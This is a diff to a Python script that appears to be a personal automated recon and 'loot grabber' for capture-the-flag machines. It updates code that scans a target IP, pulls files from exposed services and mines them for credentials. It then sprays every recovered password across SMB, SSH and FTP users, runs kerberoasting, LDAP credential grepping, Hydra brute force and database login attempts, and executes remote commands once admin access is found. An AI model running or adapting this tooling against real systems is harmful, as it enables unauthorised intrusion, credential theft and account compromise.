@@ -63,7 +63,7 @@ T_FULLSCAN = 480
 T_SVCSCAN  = 360
 T_GOBUSTER = 420
 T_VHOST    = 150
-T_HYDRA    = 600
+T_HYDRA    = 300   # ~5 min budget - a long online brute means the path is elsewhere
 T_GENERIC  = 180
 
 _P = {"g":"\033[32m","G":"\033[92m","c":"\033[36m","C":"\033[96m",
@@ -110,10 +110,12 @@ def start_heartbeat():
     return stop
 
 _TAGCOL = {}
+_TAGCOL_LOCK = threading.Lock()
 _PALETTE = ["c","G","Y","g","C","y"]
 def _tagcolor(t):
-    if t not in _TAGCOL: _TAGCOL[t] = _PALETTE[len(_TAGCOL) % len(_PALETTE)]
-    return _TAGCOL[t]
+    with _TAGCOL_LOCK:
+        if t not in _TAGCOL: _TAGCOL[t] = _PALETTE[len(_TAGCOL) % len(_PALETTE)]
+        return _TAGCOL[t]
 def _pfx(t): return col(_tagcolor(t), t)+" " if t else ""
 
 def info(s, t=None):
@@ -184,9 +186,12 @@ def have(tool): return shutil.which(tool) is not None
 _POSIX = (os.name == "posix")
 
 def _popen(cmd, **kw):
-    """Popen that opens its own process group on POSIX (for a clean kill)."""
+    """Popen that opens its own process group on POSIX (for a clean kill).
+    stdin is detached (DEVNULL) so a child that wants a password/confirmation
+    (mysql -p, ssh, ffuf) reads EOF instead of blocking on our terminal."""
     if _POSIX:
         kw["start_new_session"] = True
+    kw.setdefault("stdin", subprocess.DEVNULL)
     return subprocess.Popen(cmd, **kw)
 
 def _killtree(p):
@@ -240,7 +245,10 @@ def run_live(cmd, t=None, outfile=None, timeout=T_GENERIC, filt=None, echo=True)
                    text=True, errors="replace", bufsize=1)
     except FileNotFoundError:
         warn(f"not installed: {cmd[0]}", t); return (127, "")
-    killer = threading.Timer(timeout, _killtree, args=(p,)); killer.start()
+    timed_out = {"v": False}
+    def _on_timeout():
+        timed_out["v"] = True; _killtree(p)
+    killer = threading.Timer(timeout, _on_timeout); killer.start()
     buf = []
     try:
         for line in p.stdout:
@@ -254,7 +262,8 @@ def run_live(cmd, t=None, outfile=None, timeout=T_GENERIC, filt=None, echo=True)
         killer.cancel()
     text = "".join(buf)
     if outfile: Path(outfile).write_text(text, errors="replace")
-    return (p.returncode or 0, text)
+    rc = 124 if timed_out["v"] else (p.returncode or 0)
+    return (rc, text)
 
 CRED_RE = re.compile("|".join([
     r"-----BEGIN (?:RSA|OPENSSH|DSA|EC|PGP) PRIVATE KEY-----",
@@ -299,9 +308,11 @@ def _scan_pairs(text, src):
         cm = _COMBO.match(line)
         if cm and not line.lower().startswith(("http","ftp")):
             cu, cpw = cm.group(1), cm.group(2)
-            # drop paths / HTTP directives
-            if not cpw.startswith(("/",".")) and cu.lower() not in (
-                    "disallow","allow","user-agent","sitemap","host","location","note"):
+            # drop paths / HTTP directives / host:port / all-numeric pairs
+            if (not cpw.startswith(("/",".")) and cu.lower() not in (
+                    "disallow","allow","user-agent","sitemap","host","location","note")
+                    and not (_is_ip(cu) and cpw.isdigit())
+                    and not (cu.isdigit() and cpw.isdigit())):
                 add_cred(cu, cpw, f"credscan:{src}")
         for m in _USER_VAL.finditer(line): users.append((i, m.group(1)))
         for m in _PASS_VAL.finditer(line): passes.append((i, m.group(1)))
@@ -326,6 +337,8 @@ def scan_creds(root):
         if not f.is_file() or f.suffix.lower() in SKIP_EXT: continue
         try:
             if f.stat().st_size > 5_000_000: continue
+            with open(f, "rb") as fh:
+                if b"\x00" in fh.read(4096): continue   # binary (unknown ext)
             text = f.read_text(errors="replace")
         except OSError:
             continue
@@ -380,13 +393,20 @@ def portscan(ip):
 
 def _is_ip(s): return bool(re.fullmatch(r"[\d.]+", s))
 
+# public CA / CDN names that show up in cert SANs but are never the target vhost
+_SAN_NOISE = ("verisign.com","digicert.com","sectigo.com","comodoca.com",
+              "letsencrypt.org","cloudflaressl.com","cloudflare.com","example.com",
+              "example.org","localhost","akamai.net","amazonaws.com")
 def all_hostnames(ip, svc):
     """Collect all plausible vhosts: redirect, CN, ALL cert SANs, curl redirect."""
     hosts = []
     def add(h):
         h = (h or "").strip("/").lower()
-        if h and not _is_ip(h) and h not in hosts:
-            hosts.append(h)
+        if not h or _is_ip(h) or h in hosts:
+            return
+        if any(h == n or h.endswith("."+n) for n in _SAN_NOISE):
+            return   # public CA/CDN SAN, not the box
+        hosts.append(h)
     if DOMAIN: add(DOMAIN)
     for m in re.finditer(r"redirect to https?://([A-Za-z0-9.\-]+)", svc): add(m.group(1))
     for m in re.finditer(r"commonName=([A-Za-z0-9.\-]+)", svc): add(m.group(1))
@@ -407,7 +427,18 @@ def add_host(ip, host):
     with _HOSTS_LOCK:
         try:
             hp = Path("/etc/hosts"); content = hp.read_text()
-            if re.search(rf"\b{re.escape(host)}\b", content): return
+            # match the line that lists `host` as a full token (not a substring like
+            # `baby` inside `baby.vl`), ignoring comment lines.
+            line_re = re.compile(rf"(?m)^[^\n#]*?\s{re.escape(host)}(?=\s|$)[^\n]*$")
+            m = line_re.search(content)
+            if m:
+                cur_ip = m.group(0).split()[0]
+                if cur_ip == ip:
+                    return                       # already mapped correctly
+                # stale mapping (recycled box IP) -> rewrite it
+                hp.write_text(line_re.sub(f"{ip}\t{host}", content))
+                ok(f"/etc/hosts ~> {ip} {host} (was {cur_ip})", "hosts")
+                return
             with hp.open("a") as f: f.write(f"{ip}\t{host}\n")
             ok(f"/etc/hosts += {ip} {host}", "hosts")
         except PermissionError:
@@ -739,7 +770,6 @@ def web_fingerprint(base, tag):
         _, w = run_live(["wpscan","--url",base,"--no-banner","--random-user-agent",
                          "-e","vp,u","--format","cli-no-color"],
                         t=tag, timeout=T_GOBUSTER, echo=False)
-        for m in re.finditer(r"(?i)\| User\(s\) Identified.*", w): pass
         for u in sorted(set(re.findall(r"(?i)\[\+\]\s+([A-Za-z0-9._\-]+)\s*$", w, re.M)))[:20]:
             finding("WEB", f"wp user: {u}", tag)
     elif "drupal" in apps and have("droopescan"):
@@ -988,16 +1018,19 @@ def db_probe(ip, port, kind, out):
     for pw in pws:
         rc = None
         if kind == "mysql" and have("mysql"):
-            rc, _ = run(["mysql","-h",ip,"-u",user,f"-p{pw}","-e","SELECT 1"], timeout=30)
+            # --password= (not -p) so an empty pw doesn't trigger an interactive prompt
+            rc, _ = run(["mysql","-h",ip,"-u",user,f"--password={pw}",
+                         "--connect-timeout=10","-e","SELECT 1"], timeout=30)
         elif kind == "postgres" and have("psql"):
-            env_pw = pw
-            r = subprocess.run(["psql","-h",ip,"-U",user,"-c","SELECT 1","-w"],
-                               capture_output=True, text=True,
-                               env={**os.environ,"PGPASSWORD":env_pw}, timeout=30) \
-                if not DRY_RUN else None
             if DRY_RUN:
                 _dry(["psql","-h",ip,"-U",user,"-c","SELECT 1"], kind); return
-            rc = r.returncode
+            try:
+                r = subprocess.run(["psql","-h",ip,"-U",user,"-c","SELECT 1","-w"],
+                                   capture_output=True, text=True, stdin=subprocess.DEVNULL,
+                                   env={**os.environ,"PGPASSWORD":pw}, timeout=30)
+                rc = r.returncode
+            except (subprocess.TimeoutExpired, OSError):
+                rc = 124
         elif kind == "mssql" and (have("impacket-mssqlclient") or have("mssqlclient.py")):
             tool = shutil.which("impacket-mssqlclient") or shutil.which("mssqlclient.py")
             rc, o = run([tool, f"{user}:{pw}@{ip}","-command","SELECT 1"], timeout=30)
@@ -1169,6 +1202,7 @@ def _nxc_call(nxc, proto, targets, authargs, timeout):
 
 _SPRAYED_BATCH = set()   # (proto, secret, kind) - broad-spray dedup (2nd round)
 _SPRAYED_NAMED = set()   # (user, secret, kind)   - SSH/FTP dedup
+_POST_CRED_DONE = set()  # (user, secret, kind)   - post-auth AD steps run once per cred
 
 def spray_creds(ip, svcmap, out, host=""):
     """Pivot spray. Core idea: spray EVERY found password against ALL known users
@@ -1217,9 +1251,19 @@ def spray_creds(ip, svcmap, out, host=""):
                         else:
                             finding("PIVOT", f"{base}{' ADMIN' if admin else ''} (from {src})", "spray")
                         add_cred(u, secret, f"spray/{proto}", kind=kind, announce=False)  # remember real user
-                        if admin and proto == "smb":
+                        # A cleanly usable cred ([+], no blocking STATUS) enables
+                        # authenticated AD enum for ANY user - kerberoast and the LDAP
+                        # description grep need only a valid account, not an admin.
+                        # (must-change/expired/restricted creds can't bind -> skipped.)
+                        usable = not status
+                        if usable and (u, secret, kind) not in _POST_CRED_DONE:
+                            _POST_CRED_DONE.add((u, secret, kind))
                             kerberoast(ip, u, secret, kind, dom, out)
                             ldap_creds(ip, u, secret, kind, dom, out)
+                            if proto == "smb":
+                                # authenticated user/share enum -> feeds round-2 spray
+                                nxc_smb_enum(ip, out, u, secret, kind)
+                        if admin and proto == "smb":
                             _, w = run([nxc,"smb",tgt,"-u",u,("-H" if kind=="hash" else "-p"),
                                         secret,"-x","whoami", *dflag], timeout=40)
                             for ln in re.findall(r"(?i)\b\S+\\\S+", w)[:1]:
@@ -1388,6 +1432,7 @@ def parse_args(argv):
         description="full-auto recon & loot grabber (by p4cket)")
     p.add_argument("ip", help="target IP")
     p.add_argument("-d","--domain", default="", help="force the AD domain (else auto)")
+    p.add_argument("-o","--outdir", default="", help="output dir (default: p4ckrat/<ip>/)")
     p.add_argument("--udp", action="store_true", help="also run a parallel UDP top-20 scan")
     p.add_argument("--nuclei", action="store_true", help="run nuclei on web ports")
     p.add_argument("--crawl", action="store_true", help="crawl web ports with katana/gau")
@@ -1413,7 +1458,8 @@ def main():
     DRY_RUN    = args.dry_run
     VERBOSITY  = 0 if args.quiet else (2 if args.verbose else 1)
     ip = args.ip
-    out = Path("p4ckrat")          # fixed folder in the current directory
+    # per-target folder so a new box doesn't overwrite the previous run's findings
+    out = Path(args.outdir) if args.outdir else Path("p4ckrat")/re.sub(r"[^A-Za-z0-9._-]+","_",ip)
     out.mkdir(parents=True, exist_ok=True)
 
     logf  = open(out/"p4ckrat.log", "w", encoding="utf-8")
@@ -1422,93 +1468,96 @@ def main():
     findf.flush()
     set_logs(logf, findf)
 
-    banner(ip)
-    info(f"live findings  -> {out}/findings.txt", None)
-    info(f"full log       -> {out}/p4ckrat.log", None)
-    if DRY_RUN: warn("DRY-RUN: nothing is executed, only commands are shown")
-    if not have("nmap"): err("nmap missing, abort"); sys.exit(1)
-    hb = start_heartbeat()
+    hb = None
+    try:
+        banner(ip)
+        info(f"live findings  -> {out}/findings.txt", None)
+        info(f"full log       -> {out}/p4ckrat.log", None)
+        if DRY_RUN: warn("DRY-RUN: nothing is executed, only commands are shown")
+        if not have("nmap"): err("nmap missing, abort"); sys.exit(1)
+        hb = start_heartbeat()
 
-    svcmap, svc = portscan(ip)
-    if not svcmap:
-        warn("no open ports, nothing to do"); return
-    finding("PORTS", ", ".join(f"{p}/{svcmap[p][0]}" for p in sorted(svcmap, key=int)))
-    hosts = all_hostnames(ip, svc)
-    host = hosts[0] if hosts else ""
-    for h in hosts:
-        finding("HOST", h); add_host(ip, h)
-    dom = _domain_for(host)
-    if dom and dom != host: add_host(ip, dom)   # make the bare AD domain resolve too
+        svcmap, svc = portscan(ip)
+        if not svcmap:
+            warn("no open ports, nothing to do"); return
+        finding("PORTS", ", ".join(f"{p}/{svcmap[p][0]}" for p in sorted(svcmap, key=int)))
+        hosts = all_hostnames(ip, svc)
+        host = hosts[0] if hosts else ""
+        for h in hosts:
+            finding("HOST", h); add_host(ip, h)
+        dom = _domain_for(host)
+        if dom and dom != host: add_host(ip, dom)   # make the bare AD domain resolve too
 
-    web_ports = [p for p,(n,_) in svcmap.items() if _is_web(p, n)]
+        web_ports = [p for p,(n,_) in svcmap.items() if _is_web(p, n)]
 
-    has = lambda port, kw: port in svcmap or any(kw in n for n,_ in svcmap.values())
-    if web_ports and not args.no_gobuster:
-        DO_GOBUSTER = ask(f"run gobuster (recursive dir fuzz) on port {', '.join(web_ports)}?",
-                          default="y")
-    else:
-        DO_GOBUSTER = False
-    if web_ports and not DO_GOBUSTER:
-        info("gobuster skipped (index/hints only)")
+        has = lambda port, kw: port in svcmap or any(kw in n for n,_ in svcmap.values())
+        if web_ports and not args.no_gobuster:
+            DO_GOBUSTER = ask(f"run gobuster (recursive dir fuzz) on port {', '.join(web_ports)}?",
+                              default="y")
+        else:
+            DO_GOBUSTER = False
+        if web_ports and not DO_GOBUSTER:
+            info("gobuster skipped (index/hints only)")
 
-    head("ENUM (parallel)")
-    db_ports = [(p,k) for p,k in (("1433","mssql"),("3306","mysql"),("5432","postgres")) if p in svcmap]
-    workers = list(filter(None,[
-        "ftp"      if "21" in svcmap else "",
-        "smb"      if ("445" in svcmap or "139" in svcmap) else "",
-        *[f"web:{p}" for p in web_ports],
-        "kerberos" if "88" in svcmap else "",
-        "ldap"     if has("389","ldap") or "636" in svcmap or "3268" in svcmap else "",
-        "snmp"     if "161" in svcmap else "",
-        "nfs"      if ("2049" in svcmap or "111" in svcmap) else "",
-        "rpc"      if "135" in svcmap else "",
-        "redis"    if "6379" in svcmap else "",
-        "rsync"    if "873" in svcmap else "",
-        *[k for _,k in db_ports]]))
-    info(f"{CONCURRENCY} workers: "+col("w",", ".join(workers)))
-    jobs = []
-    with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
-        if "21" in svcmap: jobs.append(ex.submit(ftp_anon, ip, out))
-        if "445" in svcmap or "139" in svcmap: jobs.append(ex.submit(smb_anon, ip, out))
-        for wp in web_ports: jobs.append(ex.submit(web, ip, wp, out, host))
-        if "88" in svcmap: jobs.append(ex.submit(kerberos, ip, out, host))
-        if has("389","ldap") or "636" in svcmap or "3268" in svcmap:
-            jobs.append(ex.submit(ldap_enum, ip, out, host))
-        if "161" in svcmap: jobs.append(ex.submit(snmp_enum, ip, out))
-        if "2049" in svcmap or "111" in svcmap: jobs.append(ex.submit(nfs_enum, ip, out))
-        if "135" in svcmap: jobs.append(ex.submit(rpc_enum, ip, out))
-        if "6379" in svcmap: jobs.append(ex.submit(redis_enum, ip, out))
-        if "873" in svcmap: jobs.append(ex.submit(rsync_enum, ip, out))
-        for p,k in db_ports: jobs.append(ex.submit(db_probe, ip, p, k, out))
-        for f in as_completed(jobs):
-            try: f.result()
-            except Exception as e: err(f"phase error: {e!r}")
+        head("ENUM (parallel)")
+        db_ports = [(p,k) for p,k in (("1433","mssql"),("3306","mysql"),("5432","postgres")) if p in svcmap]
+        workers = list(filter(None,[
+            "ftp"      if "21" in svcmap else "",
+            "smb"      if ("445" in svcmap or "139" in svcmap) else "",
+            *[f"web:{p}" for p in web_ports],
+            "kerberos" if "88" in svcmap else "",
+            "ldap"     if has("389","ldap") or "636" in svcmap or "3268" in svcmap else "",
+            "snmp"     if "161" in svcmap else "",
+            "nfs"      if ("2049" in svcmap or "111" in svcmap) else "",
+            "rpc"      if "135" in svcmap else "",
+            "redis"    if "6379" in svcmap else "",
+            "rsync"    if "873" in svcmap else "",
+            *[k for _,k in db_ports]]))
+        info(f"{CONCURRENCY} workers: "+col("w",", ".join(workers)))
+        jobs = []
+        with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
+            if "21" in svcmap: jobs.append(ex.submit(ftp_anon, ip, out))
+            if "445" in svcmap or "139" in svcmap: jobs.append(ex.submit(smb_anon, ip, out))
+            for wp in web_ports: jobs.append(ex.submit(web, ip, wp, out, host))
+            if "88" in svcmap: jobs.append(ex.submit(kerberos, ip, out, host))
+            if has("389","ldap") or "636" in svcmap or "3268" in svcmap:
+                jobs.append(ex.submit(ldap_enum, ip, out, host))
+            if "161" in svcmap: jobs.append(ex.submit(snmp_enum, ip, out))
+            if "2049" in svcmap or "111" in svcmap: jobs.append(ex.submit(nfs_enum, ip, out))
+            if "135" in svcmap: jobs.append(ex.submit(rpc_enum, ip, out))
+            if "6379" in svcmap: jobs.append(ex.submit(redis_enum, ip, out))
+            if "873" in svcmap: jobs.append(ex.submit(rsync_enum, ip, out))
+            for p,k in db_ports: jobs.append(ex.submit(db_probe, ip, p, k, out))
+            for f in as_completed(jobs):
+                try: f.result()
+                except Exception as e: err(f"phase error: {e!r}")
 
-    head("CREDENTIAL-SCAN")
-    info("scanning looted files for credentials...")
-    creds = scan_creds(out/"files")
-    if creds:
-        warn(f"{len(creds)} possible credential hit(s) in files/")
-        for h in creds: finding("CREDS", h[:160])
-    else:
-        info("no credential hits (files/)")
+        head("CREDENTIAL-SCAN")
+        info("scanning looted files for credentials...")
+        creds = scan_creds(out/"files")
+        if creds:
+            warn(f"{len(creds)} possible credential hit(s) in files/")
+            for h in creds: finding("CREDS", h[:160])
+        else:
+            info("no credential hits (files/)")
 
-    spray_creds(ip, svcmap, out, host)   # round 1: enum/credscan creds
-    ssh_key_loot(ip, out, svcmap, host)
-    hydra_prompt(ip, svcmap, out)
-    spray_creds(ip, svcmap, out, host)   # round 2: new creds (hydra/secretsdump)
-    searchsploit_scan(svcmap)
+        spray_creds(ip, svcmap, out, host)   # round 1: enum/credscan creds
+        ssh_key_loot(ip, out, svcmap, host)
+        hydra_prompt(ip, svcmap, out)
+        spray_creds(ip, svcmap, out, host)   # round 2: new creds (hydra/secretsdump)
+        searchsploit_scan(svcmap)
 
-    hb.set()   # stop heartbeat
-    head("DONE")
-    ok(f"done in {_el()} -> {col('G',str(out))}/")
-    info(col("w",f"{out}/findings.txt")+col("d","  (live findings)"))
-    info(col("w",f"{out}/p4ckrat.log")+col("d","  (full log)"))
-    if (out/"files").exists():
-        info(col("w",f"{out}/files/")+col("d","  (loot)"))
-    emit()
-    try: logf.close(); findf.close()
-    except Exception: pass
+        head("DONE")
+        ok(f"done in {_el()} -> {col('G',str(out))}/")
+        info(col("w",f"{out}/findings.txt")+col("d","  (live findings)"))
+        info(col("w",f"{out}/p4ckrat.log")+col("d","  (full log)"))
+        if (out/"files").exists():
+            info(col("w",f"{out}/files/")+col("d","  (loot)"))
+        emit()
+    finally:
+        if hb is not None: hb.set()   # stop heartbeat
+        try: logf.close(); findf.close()
+        except Exception: pass
 
 if __name__ == "__main__":
     try: main()
